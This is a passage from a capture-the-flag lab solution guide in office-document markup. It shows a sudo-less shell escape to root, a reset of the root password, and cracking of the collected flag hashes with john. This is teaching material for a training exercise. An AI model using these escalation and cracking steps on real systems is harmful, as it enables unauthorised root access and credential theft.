      <text:p text:style-name="P1">stallman:Documents\ $ su sysadmin</text:p>
      <text:p text:style-name="P1">Password: </text:p>
      <text:p text:style-name="P1">sysadmin:Documents\ $ cd</text:p>
      <text:p text:style-name="P1">sysadmin:~\ $ nano .bashrc</text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P1">Find the `#Alias definitions` section:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P1"># Alias definitions.</text:p>
      <text:p text:style-name="P1">alias flag="echo You found 'flag_6:\$1\$Qbq.XLLp\$oj.BXuxR2q99bJwNEFhSH1'"</text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Run the `flag` alias.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">sysadmin:~\ $ flag</text:p>
      <text:p text:style-name="P1">You found flag_6:$1$Qbq.XLLp$oj.BXuxR2q99bJwNEFhSH1</text:p>
      <text:p text:style-name="P1">sysadmin:~\ $ </text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">**Solution 2:**</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Run the `alias` command to list all this user's custom aliases and find the `flag` alias:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">sysadmin:~\ $ alias</text:p>
      <text:p text:style-name="P1">alias alert='notify-send --urgency=low -i "$([ $? = 0 ] &amp;&amp; echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&amp;|]\s*alert$//'\'')"'</text:p>
      <text:p text:style-name="P1">alias egrep='egrep --color=auto'</text:p>
      <text:p text:style-name="P1">alias fgrep='fgrep --color=auto'</text:p>
      <text:p text:style-name="P1">alias flag='echo You found \'flag_6:$1$Qbq.XLLp$oj.BXuxR2q99bJwNEFhSH1\''</text:p>
      <text:p text:style-name="P1">alias grep='grep --color=auto'</text:p>
      <text:p text:style-name="P1">alias l='ls -CF'</text:p>
      <text:p text:style-name="P1">alias la='ls -A'</text:p>
      <text:p text:style-name="P1">alias ll='ls -alF'</text:p>
      <text:p text:style-name="P1">alias ls='ls --color=auto'</text:p>
      <text:p text:style-name="P1">sysadmin:~\ $ </text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Find an exploit to gain a root shell.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">**Solution:**</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Look at the `sudo` permissions for sysadmin:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">sysadmin:~\ $ sudo -l</text:p>
      <text:p text:style-name="P1">[sudo] password for sysadmin: </text:p>
      <text:p text:style-name="P1">Matching Defaults entries for sysadmin on scavenger-hunt:</text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">env_reset, exempt_group=sudo, mail_badpass,</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</text:span></text:p>
      <text:p text:style-name="P3"><text:soft-page-break/></text:p>
      <text:p text:style-name="P1">User sysadmin may run the following commands on</text:p>
      <text:p text:style-name="P2"><text:s text:c="8"/><text:span text:style-name="T1">scavenger-hunt:</text:span></text:p>
      <text:p text:style-name="P2"><text:s text:c="4"/><text:span text:style-name="T1">(ALL : ALL) /usr/bin/less</text:span></text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">You have the ability to run `less` with `sudo`. </text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Run less on a file and drop to a root shell:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">sysadmin:~\ $ touch file &amp;&amp; sudo less file</text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Once inside `less` open a bash shell with `:` then `!bash`</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">sysadmin:~\ $ touch file &amp;&amp; sudo less file</text:p>
      <text:p text:style-name="P1">root:~\ $ </text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">### flag_7:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Login as the root user.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">**Solution:**</text:p>
      <text:p text:style-name="P1">Now that you have a root shell, change the password for the root user and then login as `root`.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">root:~\ $ passwd</text:p>
      <text:p text:style-name="P1">Enter new UNIX password: </text:p>
      <text:p text:style-name="P1">Retype new UNIX password: </text:p>
      <text:p text:style-name="P1">passwd: password updated successfully</text:p>
      <text:p text:style-name="P1">root:~\ $ exit</text:p>
      <text:p text:style-name="P1">exit</text:p>
      <text:p text:style-name="P1">!done <text:s/>(press RETURN)</text:p>
      <text:p text:style-name="P1">sysadmin:~\ $ su root</text:p>
      <text:p text:style-name="P1">Password: </text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">You found flag_7:$1$zmr05X2t$QfOdeJVDpph5pBPpVL6oy0</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">root@scavenger-hunt:/home/sysadmin#</text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">### flag_8:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Gather each of the 7 flags into a file and format it as if each flag was a username and password.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Crack these passwords for the final flag.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">**Solution:**</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Now that you have root access, you can search for all the flags (for non-`root` users) on the entire system and pull them into one file.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">root@scavenger-hunt:~# grep -ir 'flag' /home/</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/>/home/student/.bash_history:cat ~/Desktop/.flag_1 </text:p>
      <text:p text:style-name="P1">/home/student/Desktop/.flag_1: You found 'flag_1:$1$WYmnR327$5C1yY4flBxB1cLjkc92Tq.'</text:p>
      <text:p text:style-name="P1">/home/babbage/.bashrc:echo You found 'flag_3:$1$Y9tp8XTi$m6pAR1bQ36oAh.At4G5s3.'</text:p>
      <text:p text:style-name="P1">/home/stallman/.bashrc:echo You found 'flag_4:$1$lGQ7QprJ$m4eE.b8jhvsp8CNbuIF5U0'</text:p>
      <text:p text:style-name="P1">/home/mitnik/.bashrc:echo You found 'flag_2:$1$PEDICYq8$6/U/a5Ykxw1OP0.eSrMZO0'</text:p>
      <text:p text:style-name="P1">/home/sysadmin/.bashrc:alias flag="echo You found 'flag_6:\$1\$Qbq.XLLp\$oj.BXuxR2q99bJwNEFhSH1'"</text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Output these results to a file called `flags`:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">root@scavenger-hunt:~# grep -ir 'flag' /home/ &gt; flags</text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Next, append `flag_5` from the `/var/tmp/5galf` to the `flags` file:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">root@scavenger-hunt:~# cat /var/tmp/5galf &gt;&gt; flags</text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Append in `flag_7` from `root`'s `.bashrc` file:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">root@scavenger-hunt:~# grep -r 'flag' /root/.bashrc</text:p>
      <text:p text:style-name="P1">echo You found 'flag_7:$1$zmr05X2t$QfOdeJVDpph5pBPpVL6oy0'</text:p>
      <text:p text:style-name="P1">root@scavenger-hunt:~# grep -r 'flag' /root/.bashrc &gt;&gt; flags</text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Edit your flags file with `nano` to remove all extraneous text and characters, to look like this:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">flag_1:$1$WYmnR327$5C1yY4flBxB1cLjkc92Tq. </text:p>
      <text:p text:style-name="P1">flag_2:$1$PEDICYq8$6/U/a5Ykxw1OP0.eSrMZO0 </text:p>
      <text:p text:style-name="P1">flag_3:$1$Y9tp8XTi$m6pAR1bQ36oAh.At4G5s3. </text:p>
      <text:p text:style-name="P1">flag_4:$1$lGQ7QprJ$m4eE.b8jhvsp8CNbuIF5U0 </text:p>
      <text:p text:style-name="P1">flag_5:$1$zuzYyKCN$secHwYBXIELGqOv8rWzG00</text:p>
      <text:p text:style-name="P1">flag_6:$1$Qbq.XLLp$oj.BXuxR2q99bJwNEFhSH1 <text:s/></text:p>
      <text:p text:style-name="P1">flag_7:$1$zmr05X2t$QfOdeJVDpph5pBPpVL6oy0 </text:p>
      <text:p text:style-name="P1">```</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">- **Note**: be sure to remove the `\` backslashes from `flag_6`. </text:p>
      <text:p text:style-name="P2"><text:s text:c="2"/><text:span text:style-name="T1">- *Alternatively*, as `sysadmin`, pipe the flag alias to `flags` with: `flag &gt;&gt; flags`</text:span></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">- Be sure to remove any duplicates.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">- Don't forget to remove all quotation marks!</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">The `flags` file is now in a username:hashed-password format ready to be cracked by `john`!</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">Crack this file with `john` and the `pass_list.txt` you found in the `/home/student/Desktop/.pass_list.txt`</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">```bash</text:p>
      <text:p text:style-name="P1">root@scavenger-hunt:~# john --wordlist=/home/student/Desktop/.pass_list.txt flags</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/>Created directory: /root/.john</text:p>
      <text:p text:style-name="P1">Loaded 7 password hashes with 7 different salts (md5crypt [MD5 32/64 X2])</text:p>
      <text:p text:style-name="P1">Press 'q' or Ctrl-C to abort, almost any other key for status</text:p>
      <text:p text:style-name="P1">Congratulations <text:s/>(flag_1)</text:p>
      <text:p text:style-name="P1">challenge. <text:s text:c="6"/>(flag_7)</text:p>
      <text:p text:style-name="P1">this <text:s text:c="12"/>(flag_5)</text:p>
      <text:p text:style-name="P1">You <text:s text:c="13"/>(flag_2)</text:p>
      <text:p text:style-name="P1">cyber <text:s text:c="11"/>(flag_6)</text:p>
      <text:p text:style-name="P1">completed <text:s text:c="7"/>(flag_4)</text:p>
      <text:p text:style-name="P1">6g 0:00:00:00 100% 17.14g/s 2577p/s 15165c/s 15165C/s 0000..00</text:p>
      <text:p text:style-name="P1">Use the "--show" option to display all of the cracked passwords reliably</text:p>
      <text:p text:style-name="P1">Session completed</text:p>
      <text:p text:style-name="P1">root@scavenger-hunt:~# </text:p>
      <text:p text:style-name="P1">root@scavenger-hunt:~# </text:p>
      <text:p text:style-name="P1">root@scavenger-hunt:~# john --show flags </text:p>
      <text:p text:style-name="P1">flag_1:Congratulations</text:p>
      <text:p text:style-name="P1">flag_2:You</text:p>
      <text:p text:style-name="P1">flag_3:have</text:p>
      <text:p text:style-name="P1">flag_4:completed</text:p>
      <text:p text:style-name="P1">flag_5:this</text:p>
      <text:p text:style-name="P1">flag_6:cyber</text:p>
      <text:p text:style-name="P1">flag_7:challenge.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P1">7 password hashes cracked, 0 left</text:p>
      <text:p text:style-name="P1">root@scavenger-hunt:~# </text:p>
      <text:p text:style-name="P5">```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3T18:43:59.526000000</meta:creation-date>
    <dc:date>2021-06-23T18:45:29.140000000</dc:date>
    <meta:editing-duration>PT1M29S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="11" meta:paragraph-count="439" meta:word-count="2163" meta:character-count="15965" meta:non-whitespace-character-count="13741"/>
    <meta:generator>LibreOffice/7.1.3.2$Windows_X86_64 LibreOffice_project/47f78053abe362b9384784d31a6e56f8511eb1c1</meta:generator>
  </office:meta>
</office:document-meta>
</file>